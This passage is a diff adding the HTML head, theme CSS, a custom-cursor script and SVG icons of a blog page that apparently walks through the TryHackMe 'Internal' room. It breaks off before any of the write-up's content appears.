@@ -1,0 +1,2168 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+    <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    
+
+    
+    
+
+    
+    
+
+    
+    
+
+    <title>Internal | H3X0S3</title>
+    <meta name="description" content="in this blog i've explained how to root Internal from TryHackMe">
+    
+        <meta name="keywords" content="tryhackme, CTF, WPsacn, Jenkins, groovy, Lateral movement, Port Forwarding, Reverse shell">
+    
+
+    <!-- Social: Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Internal | H3X0S3">
+    <meta name="twitter:description" content="in this blog i've explained how to root Internal from TryHackMe">
+
+    
+        <meta property="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg">
+    
+    
+    
+        <meta name="twitter:site" content="@H3X0S3">
+    
+
+    <!-- Social: Facebook / Open Graph -->
+    <meta property="og:url" content="https://h3x0s3.github.io//Internal/">
+    <meta property="og:title" content="Internal | H3X0S3">
+    <meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg">
+    <meta property="og:description" content="in this blog i've explained how to root Internal from TryHackMe">
+    <meta property="og:site_name" content="H3X0S3 | InfoSec Blog">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="//favicon.ico" type="image/x-icon" />
+    
+    <!-- Apple Touch Icons -->
+    <link rel="apple-touch-icon" href="//assets/img/icons/apple-touch-icon.png" />
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/img/icons/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/img/icons/apple-touch-icon-72x72.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/img/icons/apple-touch-icon-114x114.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/img/icons/apple-touch-icon-144x144.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/img/icons/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/img/icons/apple-touch-icon-120x120.png" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/img/icons/apple-touch-icon-76x76.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/img/icons/apple-touch-icon-152x152.png" />
+
+    <!-- Windows 8 Tile Icons -->
+    <meta name="application-name" content="H3X0S3">
+    <meta name="msapplication-TileColor" content="#0a0a0f">
+    <meta name="msapplication-square70x70logo" content="smalltile.png" />
+    <meta name="msapplication-square150x150logo" content="mediumtile.png" />
+    <meta name="msapplication-wide310x150logo" content="widetile.png" />
+    <meta name="msapplication-square310x310logo" content="largetile.png" />
+    
+    <!-- Android Lolipop Theme Color -->
+    <meta name="theme-color" content="#0a0a0f">
+
+    <!-- Fonts + all styling now provided by _includes/new-theme.html (Inter + JetBrains Mono) -->
+
+    <link rel="canonical" href="https://h3x0s3.github.io//Internal/">
+    <link rel="alternate" type="application/rss+xml" title="H3X0S3 | InfoSec Blog" href="https://h3x0s3.github.io//feed.xml" />
+
+    <!-- Include extra styles -->
+    
+
+    <!-- JavaScript enabled/disabled -->
+    <script>
+        document.querySelector('html').classList.remove('no-js');
+    </script>
+
+    <!-- ===== H3X0S3 ULTIMATE REDESIGN: dark minimalist theme + Kali cursor ===== -->
+    <!-- =====================================================================
+     H3X0S3 — ULTIMATE REDESIGN THEME
+     Minimalist Dark + Glassmorphism + Kali Linux custom cursor
+     Single self-contained include: fonts, CSS, cursor JS.
+     ===================================================================== -->
+
+<!-- Fonts: Inter (body) + JetBrains Mono (headings/code) -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --bg:        #0a0a0f;
+    --bg-soft:   #0d1117;
+    --card:      #161b22;
+    --card-2:    #1c2230;
+    --border:    #21262d;
+    --text:      #c9d1d9;
+    --text-dim:  #8b949e;
+    --accent:    #00ff9c;   /* Kali green */
+    --accent-2:  #58a6ff;   /* dev blue */
+    --accent-3:  #bc8cff;
+    --danger:    #ff7b72;
+    --radius:    14px;
+    --maxw:      860px;
+    --font-body: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+    --font-mono: 'JetBrains Mono', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    --glass:     rgba(13, 17, 23, 0.72);
+  }
+
+  /* ---------- Reset ---------- */
+  *, *::before, *::after { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; scroll-behavior: smooth; }
+  html, body {
+    margin: 0; padding: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-body);
+    font-size: clamp(15px, 1vw + 0.8rem, 18px);
+    line-height: 1.7;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+
+  /* Subtle grid glow background */
+  body::before {
+    content: "";
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(1100px 600px at 12% -10%, rgba(0,255,156,0.10), transparent 60%),
+      radial-gradient(1000px 600px at 100% 0%, rgba(88,166,255,0.10), transparent 55%),
+      linear-gradient(transparent 0 96%, rgba(255,255,255,0.022) 96%) 0 0 / 100% 38px;
+    pointer-events: none; z-index: 0;
+  }
+
+  /* ---------- Typography ---------- */
+  h1, h2, h3, h4, h5, h6 {
+    font-family: var(--font-mono);
+    color: #e6edf3;
+    line-height: 1.25;
+    letter-spacing: -0.01em;
+    margin: 1.6em 0 0.6em;
+  }
+  h1 { font-size: clamp(1.8rem, 1vw + 1.6rem, 2.8rem); }
+  h2 { font-size: clamp(1.4rem, 1vw + 1.1rem, 2rem); }
+  h3 { font-size: clamp(1.15rem, 0.8vw + 0.9rem, 1.5rem); }
+  h1::before, h2::before { content: ""; }
+  a { color: var(--accent-2); text-decoration: none; transition: color .3s ease, opacity .3s ease; }
+  a:hover { color: var(--accent); }
+  p { margin: 0 0 1rem; }
+  ::selection { background: rgba(0,255,156,0.28); color: #fff; }
+
+  /* ---------- Layout shell ---------- */
+  .content {
+    position: relative; z-index: 1;
+    width: 100%; max-width: var(--maxw);
+    margin: 0 auto;
+    padding: clamp(1.2rem, 3vw, 3rem) clamp(1rem, 4vw, 2rem);
+  }
+
+  /* ---------- Header (glass) ---------- */
+  .bar-header {
+    position: sticky; top: 0; z-index: 1000;
+    display: flex; align-items: center; gap: 1rem;
+    padding: 0.7rem clamp(1rem, 4vw, 2rem);
+    background: var(--glass);
+    backdrop-filter: saturate(160%) blur(14px);
+    -webkit-backdrop-filter: saturate(160%) blur(14px);
+    border-bottom: 1px solid var(--border);
+  }
+  .bar-header .logo a {
+    font-family: var(--font-mono);
+    font-weight: 700;
+    font-size: clamp(1.1rem, 1vw + 0.9rem, 1.45rem);
+    color: var(--accent);
+    text-shadow: 0 0 18px rgba(0,255,156,0.45);
+  }
+  .bar-header .logo a::after { content: "_"; opacity: 0.7; }
+  .bar-header #menu, .bar-header #search {
+    color: var(--text-dim);
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 38px; height: 38px; border-radius: 10px;
+    border: 1px solid var(--border);
+    background: rgba(255,255,255,0.02);
+    transition: all .3s ease;
+    cursor: pointer;
+  }
+  .bar-header #menu:hover, .bar-header #search:hover {
+    color: var(--accent); border-color: var(--accent);
+    box-shadow: 0 0 16px rgba(0,255,156,0.25);
+  }
+  .bar-header .icon-menu, .bar-header .icon-search { width: 18px; height: 18px; fill: currentColor; }
+
+  /* ---------- Cards / post lists ---------- */
+  .card, .post-card, .recommendation, article.post-list-item {
+    background: linear-gradient(180deg, var(--card), var(--card-2));
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: clamp(1rem, 2vw, 1.5rem);
+    transition: transform .3s ease, border-color .3s ease, box-shadow .3s ease;
+  }
+  .card:hover, .post-card:hover {
+    transform: translateY(-3px);
+    border-color: rgba(0,255,156,0.35);
+    box-shadow: 0 10px 30px -12px rgba(0,255,156,0.18);
+  }
+  .grid, .posts, .post-list {
+    display: grid;
+    gap: clamp(1rem, 2vw, 1.5rem);
+    grid-template-columns: repeat(auto-fit, minmax(min(100%, 280px), 1fr));
+  }
+
+  /* ---------- Post content ---------- */
+  .content img, .post-content img, article img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    background: var(--bg-soft);
+    padding: 4px;
+    display: block;
+    margin: 1.2rem auto;
+    box-shadow: 0 12px 34px -16px rgba(0,0,0,0.8);
+  }
+
+  /* Code blocks + inline code */
+  code, pre, .highlight, .highlighter-rouge {
+    font-family: var(--font-mono);
+    font-size: 0.92em;
+  }
+  :not(pre) > code {
+    background: rgba(0,255,156,0.10);
+    color: var(--accent);
+    padding: 0.15em 0.4em;
+    border-radius: 6px;
+    border: 1px solid rgba(0,255,156,0.18);
+  }
+  pre, .highlight {
+    background: var(--bg-soft) !important;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 12px;
+    padding: 1rem 1.1rem;
+    overflow-x: auto;
+    line-height: 1.55;
+  }
+  pre code { background: transparent; color: var(--text); padding: 0; border: 0; }
+  .highlight .c { color: var(--text-dim); } /* comment tweak */
+
+  blockquote {
+    margin: 1.2rem 0;
+    padding: 0.6rem 1.1rem;
+    border-left: 3px solid var(--accent-2);
+    background: rgba(88,166,255,0.06);
+    border-radius: 0 10px 10px 0;
+    color: var(--text-dim);
+  }
+  hr { border: 0; border-top: 1px solid var(--border); margin: 2rem 0; }
+
+  table { width: 100%; border-collapse: collapse; margin: 1.2rem 0; font-size: 0.92em; }
+  th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; }
+  th { background: var(--card); color: #e6edf3; }
+  tr:hover td { background: rgba(255,255,255,0.02); }
+
+  ul, ol { padding-left: 1.3rem; }
+  li { margin: 0.3rem 0; }
+
+  /* ---------- Buttons / tags ---------- */
+  a.button, .btn, button {
+    font-family: var(--font-mono);
+    background: rgba(0,255,156,0.08);
+    color: var(--accent);
+    border: 1px solid rgba(0,255,156,0.3);
+    border-radius: 10px;
+    padding: 0.55rem 0.95rem;
+    transition: all .3s ease;
+  }
+  a.button:hover, .btn:hover { background: rgba(0,255,156,0.18); box-shadow: 0 0 18px rgba(0,255,156,0.22); }
+
+  /* ---------- Footer ---------- */
+  footer, .footer {
+    position: relative; z-index: 1;
+    border-top: 1px solid var(--border);
+    background: var(--bg-soft);
+    color: var(--text-dim);
+    padding: 2rem clamp(1rem, 4vw, 2rem);
+    text-align: center;
+    font-size: 0.88rem;
+  }
+  footer a { color: var(--text-dim); } footer a:hover { color: var(--accent); }
+
+  /* ---------- Misc UI from old theme ---------- */
+  .overlay, #mask { background: rgba(0,0,0,0.55) !important; backdrop-filter: blur(3px); }
+  .pushy, .search-container { background: var(--card) !important; border-left: 1px solid var(--border); }
+  .pushy a, .search-container a { color: var(--text); transition: color .3s ease, padding-left .3s ease; }
+  .pushy a:hover { color: var(--accent); padding-left: 6px; }
+
+  /* ---------- Scrollbar ---------- */
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: #2a313c; border-radius: 8px; border: 2px solid var(--bg); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+  /* ---------- 404 / hero ---------- */
+  .hero, .page-hero { text-align: center; padding: clamp(2rem, 6vw, 4rem) 0; }
+  .hero h1 { font-size: clamp(2rem, 2vw + 2rem, 3.4rem); margin-top: 0; }
+
+  /* =====================================================================
+     KALI LINUX CUSTOM CURSOR  (desktop hover devices only)
+     ===================================================================== */
+  #kali-cursor, #kali-cursor-trail {
+    position: fixed;
+    top: 0; left: 0;
+    z-index: 999999;
+    pointer-events: none;
+    will-change: transform;
+    display: none;
+  }
+  #kali-cursor {
+    font-family: var(--font-mono);
+    font-weight: 700;
+    font-size: 18px;
+    line-height: 1;
+    color: var(--accent);
+    text-shadow: 0 0 10px rgba(0,255,156,0.9), 0 0 22px rgba(0,255,156,0.4);
+    mix-blend-mode: screen;
+    transform: translate(-50%, -50%);
+  }
+  #kali-cursor::before { content: "\2588"; }            /* terminal block █ */
+  #kali-cursor .dragon {
+    font-size: 20px;
+    margin-left: 4px;
+    filter: drop-shadow(0 0 8px rgba(0,255,156,0.6));
+  }
+  #kali-cursor .dragon::before { content: "\1F409"; }   /* 🐉 Kali dragon */
+  #kali-cursor-trail {
+    width: 34px; height: 34px;
+    border: 1px solid rgba(0,255,156,0.5);
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    box-shadow: 0 0 18px rgba(0,255,156,0.18) inset;
+    transition: width .25s ease, height .25s ease, border-color .25s ease;
+  }
+  #kali-cursor-trail.is-link { width: 52px; height: 52px; border-color: var(--accent-2); }
+
+  /* Desktop with precise hover: hide native cursor, show Kali cursor */
+  @media (hover: hover) and (pointer: fine) {
+    html, body, * { cursor: none !important; }
+    #kali-cursor, #kali-cursor-trail { display: block; }
+  }
+  /* Touch / no-hover: ensure native cursor and hide custom */
+  @media (hover: none), (pointer: coarse) {
+    html, body, * { cursor: auto !important; }
+    #kali-cursor, #kali-cursor-trail { display: none !important; }
+  }
+
+  /* Reduced motion respect */
+  @media (prefers-reduced-motion: reduce) {
+    html { scroll-behavior: auto; }
+    * { transition: none !important; animation: none !important; }
+    #kali-cursor, #kali-cursor-trail { display: none !important; }
+    html, body, * { cursor: auto !important; }
+  }
+
+  /* Responsive guard */
+  img, video, iframe, table, pre { max-width: 100%; }
+  body { overflow-x: hidden; }
+</style>
+
+<script>
+  (function () {
+    // Only build cursor on hover-capable, precise-pointer devices.
+    var canHover = window.matchMedia('(hover: hover) and (pointer: fine)').matches;
+    var reduced  = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    if (!canHover || reduced) return;
+
+    var dot   = document.createElement('div');
+    dot.id    = 'kali-cursor';
+    var dragon = document.createElement('span');
+    dragon.className = 'dragon';
+    dot.appendChild(dragon);
+
+    var ring  = document.createElement('div');
+    ring.id   = 'kali-cursor-trail';
+
+    // append ASAP (body may not exist yet)
+    function mount() { document.body.appendChild(dot); document.body.appendChild(ring); }
+    if (document.body) mount();
+    else document.addEventListener('DOMContentLoaded', mount);
+
+    var mx = window.innerWidth / 2, my = window.innerHeight / 2;
+    var dx = mx, dy = my;          // dot position (fast follow)
+    var rx = mx, ry = my;          // ring position (lerp, slower)
+
+    window.addEventListener('mousemove', function (e) {
+      mx = e.clientX; my = e.clientY;
+    }, { passive: true });
+
+    // Grow trail when hovering interactive elements
+    document.addEventListener('mouseover', function (e) {
+      var t = e.target;
+      var interactive = t.closest && t.closest('a, button, input, textarea, select, [role="button"], .card, .post-card');
+      ring.classList.toggle('is-link', !!interactive);
+    });
+
+    function tick() {
+      // dot follows quickly with tiny easing
+      dx += (mx - dx) * 0.35;
+      dy += (my - dy) * 0.35;
+      // ring follows with smoother lerp (delayed)
+      rx += (mx - rx) * 0.18;
+      ry += (my - ry) * 0.18;
+      dot.style.transform  = 'translate(' + dx + 'px,' + dy + 'px) translate(-50%,-50%)';
+      ring.style.transform = 'translate(' + rx + 'px,' + ry + 'px) translate(-50%,-50%)';
+      requestAnimationFrame(tick);
+    }
+    requestAnimationFrame(tick);
+
+    // Hide if pointer leaves the window
+    document.addEventListener('mouseleave', function () {
+      dot.style.opacity = '0'; ring.style.opacity = '0';
+    });
+    document.addEventListener('mouseenter', function () {
+      dot.style.opacity = '1'; ring.style.opacity = '1';
+    });
+  })();
+</script>
+
+</head>
+
+    <body class="has-push-menu">
+        
+
+
+
+
+
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs><symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z"/></symbol><symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z"/></symbol><symbol id="icon-close" viewBox="0 0 1000 1000"><path d="M969.8,870.3c27,27.7,27,71.8,0,99.1C955.7,983,937.9,990,920,990c-17.9,0-35.7-7-49.7-20.7L500,599L129.6,969.4C115.6,983,97.8,990,79.9,990s-35.7-7-49.7-20.7c-27-27.3-27-71.4,0-99.1L400.9,500L30.3,129.3c-27-27.3-27-71.4,0-99.1c27.3-27,71.8-27,99.4,0L500,400.9L870.4,30.2c27.7-27,71.8-27,99.4,0c27,27.7,27,71.8,0,99.1L599.1,500L969.8,870.3z"/></symbol><symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"/></symbol><symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z"/></symbol><symbol id="icon-clock" viewBox="0 0 1000 1000"><path d="M500,10C229.8,10,10,229.8,10,500c0,270.2,219.8,490,490,490c270.2,0,490-219.8,490-490C990,229.8,770.2,10,500,10z M500,910.2c-226.2,0-410.2-184-410.2-410.2c0-226.2,184-410.2,410.2-410.2c226.2,0,410.2,184,410.2,410.2C910.2,726.1,726.2,910.2,500,910.2z M753.1,374c8.2,11.9,5.2,28.1-6.6,36.3L509.9,573.7c-4.4,3.1-9.6,4.6-14.8,4.6c-4.1,0-8.3-1-12.1-3c-8.6-4.5-14-13.4-14-23.1V202.5c0-14.4,11.7-26.1,26.1-26.1c14.4,0,26.1,11.7,26.1,26.1v300l195.6-135.1C728.7,359.2,744.9,362.1,753.1,374z"/></symbol><symbol id="icon-calendar" viewBox="0 0 1000 1000"><path d="M920,500v420H80V500H920 M990,430H10v490c0,38.7,31.3,70,70,70h840c38.7,0,70-31.3,70-70V430L990,430z"/><path d="M850,80v105c0,57.9-47.2,105-105,105c-58,0-105-47.1-105-105V80H360v105c0,57.9-47.2,105-105,105c-58,0-105-47.1-105-105V80C72.8,80,10,142.7,10,220v140h980V220C990,142.7,927.2,80,850,80z"/><path d="M255,10c-19.3,0-35,15.8-35,35v140c0,19.2,15.7,35,35,35c19.3,0,35-15.8,35-35V45C290,25.8,274.3,10,255,10z"/><path d="M745,10c-19.3,0-35,15.8-35,35v140c0,19.2,15.7,35,35,35c19.3,0,35-15.8,35-35V45C780,25.8,764.3,10,745,10z"/></symbol><symbol id="icon-github" viewBox="0 0 12 14"><path d="M6 1q1.633 0 3.012 0.805t2.184 2.184 0.805 3.012q0 1.961-1.145 3.527t-2.957 2.168q-0.211 0.039-0.312-0.055t-0.102-0.234q0-0.023 0.004-0.598t0.004-1.051q0-0.758-0.406-1.109 0.445-0.047 0.801-0.141t0.734-0.305 0.633-0.52 0.414-0.82 0.16-1.176q0-0.93-0.617-1.609 0.289-0.711-0.062-1.594-0.219-0.070-0.633 0.086t-0.719 0.344l-0.297 0.187q-0.727-0.203-1.5-0.203t-1.5 0.203q-0.125-0.086-0.332-0.211t-0.652-0.301-0.664-0.105q-0.352 0.883-0.062 1.594-0.617 0.68-0.617 1.609 0 0.664 0.16 1.172t0.41 0.82 0.629 0.523 0.734 0.305 0.801 0.141q-0.305 0.281-0.383 0.805-0.164 0.078-0.352 0.117t-0.445 0.039-0.512-0.168-0.434-0.488q-0.148-0.25-0.379-0.406t-0.387-0.187l-0.156-0.023q-0.164 0-0.227 0.035t-0.039 0.090 0.070 0.109 0.102 0.094l0.055 0.039q0.172 0.078 0.34 0.297t0.246 0.398l0.078 0.18q0.102 0.297 0.344 0.48t0.523 0.234 0.543 0.055 0.434-0.027l0.18-0.031q0 0.297 0.004 0.691t0.004 0.426q0 0.141-0.102 0.234t-0.312 0.055q-1.812-0.602-2.957-2.168t-1.145-3.527q0-1.633 0.805-3.012t2.184-2.184 3.012-0.805zM2.273 9.617q0.023-0.055-0.055-0.094-0.078-0.023-0.102 0.016-0.023 0.055 0.055 0.094 0.070 0.047 0.102-0.016zM2.516 9.883q0.055-0.039-0.016-0.125-0.078-0.070-0.125-0.023-0.055 0.039 0.016 0.125 0.078 0.078 0.125 0.023zM2.75 10.234q0.070-0.055 0-0.148-0.062-0.102-0.133-0.047-0.070 0.039 0 0.141t0.133 0.055zM3.078 10.562q0.062-0.062-0.031-0.148-0.094-0.094-0.156-0.023-0.070 0.062 0.031 0.148 0.094 0.094 0.156 0.023zM3.523 10.758q0.023-0.086-0.102-0.125-0.117-0.031-0.148 0.055t0.102 0.117q0.117 0.047 0.148-0.047zM4.016 10.797q0-0.102-0.133-0.086-0.125 0-0.125 0.086 0 0.102 0.133 0.086 0.125 0 0.125-0.086zM4.469 10.719q-0.016-0.086-0.141-0.070-0.125 0.023-0.109 0.117t0.141 0.062 0.109-0.109z"></path></symbol><symbol id="icon-medium" viewBox="0 0 1000 1000"><path d="M336.5,240.2v641.5c0,9.1-2.3,16.9-6.8,23.2s-11.2,9.6-20,9.6c-6.2,0-12.2-1.5-18-4.4L37.3,782.7c-7.7-3.6-14.1-9.8-19.4-18.3S10,747.4,10,739V115.5c0-7.3,1.8-13.5,5.5-18.6c3.6-5.1,8.9-7.7,15.9-7.7c5.1,0,13.1,2.7,24.1,8.2l279.5,140C335.9,238.6,336.5,239.5,336.5,240.2L336.5,240.2z M371.5,295.5l292,473.6l-292-145.5V295.5z M990,305.3v576.4c0,9.1-2.6,16.5-7.7,22.1c-5.1,5.7-12,8.5-20.8,8.5s-17.3-2.4-25.7-7.1L694.7,784.9L990,305.3z M988.4,239.7c0,1.1-46.8,77.6-140.3,229.4C754.6,621,699.8,709.8,683.8,735.7L470.5,389l177.2-288.2c6.2-10.2,15.7-15.3,28.4-15.3c5.1,0,9.8,1.1,14.2,3.3l295.9,147.7C987.6,237.1,988.4,238.2,988.4,239.7L988.4,239.7z"/></symbol><symbol id="icon-instagram" viewBox="0 0 489.84 489.84"><path d="M249.62,50.46c65.4,0,73.14.25,99,1.43C372.47,53,385.44,57,394.07,60.32a75.88,75.88,0,0,1,28.16,18.32,75.88,75.88,0,0,1,18.32,28.16c3.35,8.63,7.34,21.6,8.43,45.48,1.18,25.83,1.43,33.57,1.43,99s-0.25,73.14-1.43,99c-1.09,23.88-5.08,36.85-8.43,45.48a81.11,81.11,0,0,1-46.48,46.48c-8.63,3.35-21.6,7.34-45.48,8.43-25.82,1.18-33.57,1.43-99,1.43s-73.15-.25-99-1.43c-23.88-1.09-36.85-5.08-45.48-8.43A75.88,75.88,0,0,1,77,423.86,75.88,75.88,0,0,1,58.69,395.7c-3.35-8.63-7.34-21.6-8.43-45.48-1.18-25.83-1.43-33.57-1.43-99s0.25-73.14,1.43-99c1.09-23.88,5.08-36.85,8.43-45.48A75.88,75.88,0,0,1,77,78.64a75.88,75.88,0,0,1,28.16-18.32c8.63-3.35,21.6-7.34,45.48-8.43,25.83-1.18,33.57-1.43,99-1.43m0-44.13c-66.52,0-74.86.28-101,1.47s-43.87,5.33-59.45,11.38A120.06,120.06,0,0,0,45.81,47.44,120.06,120.06,0,0,0,17.56,90.82C11.5,106.4,7.36,124.2,6.17,150.27s-1.47,34.46-1.47,101,0.28,74.86,1.47,101,5.33,43.87,11.38,59.45a120.06,120.06,0,0,0,28.25,43.38,120.06,120.06,0,0,0,43.38,28.25c15.58,6.05,33.38,10.19,59.45,11.38s34.46,1.47,101,1.47,74.86-.28,101-1.47,43.87-5.33,59.45-11.38a125.24,125.24,0,0,0,71.63-71.63c6.05-15.58,10.19-33.38,11.38-59.45s1.47-34.46,1.47-101-0.28-74.86-1.47-101-5.33-43.87-11.38-59.45a120.06,120.06,0,0,0-28.25-43.38,120.06,120.06,0,0,0-43.38-28.25C394.47,13.13,376.67,9,350.6,7.8s-34.46-1.47-101-1.47h0Z" transform="translate(-4.7 -6.33)" /><path d="M249.62,125.48A125.77,125.77,0,1,0,375.39,251.25,125.77,125.77,0,0,0,249.62,125.48Zm0,207.41a81.64,81.64,0,1,1,81.64-81.64A81.64,81.64,0,0,1,249.62,332.89Z" transform="translate(-4.7 -6.33)"/><circle cx="375.66" cy="114.18" r="29.39" /></symbol><symbol id="icon-linkedin" viewBox="0 0 12 14"><path d="M2.727 4.883v7.742h-2.578v-7.742h2.578zM2.891 2.492q0.008 0.57-0.395 0.953t-1.059 0.383h-0.016q-0.641 0-1.031-0.383t-0.391-0.953q0-0.578 0.402-0.957t1.051-0.379 1.039 0.379 0.398 0.957zM12 8.187v4.437h-2.57v-4.141q0-0.82-0.316-1.285t-0.988-0.465q-0.492 0-0.824 0.27t-0.496 0.668q-0.086 0.234-0.086 0.633v4.32h-2.57q0.016-3.117 0.016-5.055t-0.008-2.313l-0.008-0.375h2.57v1.125h-0.016q0.156-0.25 0.32-0.438t0.441-0.406 0.68-0.34 0.895-0.121q1.336 0 2.148 0.887t0.813 2.598z"></path></symbol><symbol id="icon-heart" viewBox="0 0 34 30"><path d="M17,29.7 L16.4,29.2 C3.5,18.7 0,15 0,9 C0,4 4,0 9,0 C13.1,0 15.4,2.3 17,4.1 C18.6,2.3 20.9,0 25,0 C30,0 34,4 34,9 C34,15 30.5,18.7 17.6,29.2 L17,29.7 Z M9,2 C5.1,2 2,5.1 2,9 C2,14.1 5.2,17.5 17,27.1 C28.8,17.5 32,14.1 32,9 C32,5.1 28.9,2 25,2 C21.5,2 19.6,4.1 18.1,5.8 L17,7.1 L15.9,5.8 C14.4,4.1 12.5,2 9,2 Z" id="Shape"></path></symbol><symbol id="icon-arrow-right" viewBox="0 0 25.452 25.452"><path d="M4.471,24.929v-2.004l12.409-9.788c0.122-0.101,0.195-0.251,0.195-0.411c0-0.156-0.073-0.31-0.195-0.409L4.471,2.526V0.522c0-0.2,0.115-0.384,0.293-0.469c0.18-0.087,0.396-0.066,0.552,0.061l15.47,12.202c0.123,0.1,0.195,0.253,0.195,0.409c0,0.16-0.072,0.311-0.195,0.411L5.316,25.34c-0.155,0.125-0.372,0.147-0.552,0.061C4.586,25.315,4.471,25.13,4.471,24.929z"/></symbol><symbol id="icon-star" viewBox="0 0 48 48"><path fill="currentColor" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"/><path fill="#ffffff" d="M24,11l3.898,7.898l8.703,1.301l-6.301,6.102l1.5,8.699L24,30.898L16.199,35l1.5-8.699l-6.301-6.102  l8.703-1.301L24,11z"/></symbol><symbol id="icon-read" viewBox="0 0 32 32"><path fill="currentColor" d="M29,4H3C1.343,4,0,5.343,0,7v18c0,1.657,1.343,3,3,3h10c0,0.552,0.448,1,1,1h4c0.552,0,1-0.448,1-1h10  c1.657,0,3-1.343,3-3V7C32,5.343,30.657,4,29,4z M29,5v20H18.708c-0.618,0-1.236,0.146-1.789,0.422l-0.419,0.21V5H29z M15.5,5  v20.632l-0.419-0.21C14.528,25.146,13.91,25,13.292,25H3V5H15.5z M31,25c0,1.103-0.897,2-2,2H18v1h-4v-1H3c-1.103,0-2-0.897-2-2V7  c0-0.737,0.405-1.375,1-1.722V25c0,0.552,0.448,1,1,1h10.292c0.466,0,0.925,0.108,1.342,0.317l0.919,0.46  c0.141,0.07,0.294,0.106,0.447,0.106c0.153,0,0.306-0.035,0.447-0.106l0.919-0.46C17.783,26.108,18.242,26,18.708,26H29  c0.552,0,1-0.448,1-1V5.278C30.595,5.625,31,6.263,31,7V25z M6,12.5C6,12.224,6.224,12,6.5,12h5c0.276,0,0.5,0.224,0.5,0.5  S11.776,13,11.5,13h-5C6.224,13,6,12.776,6,12.5z 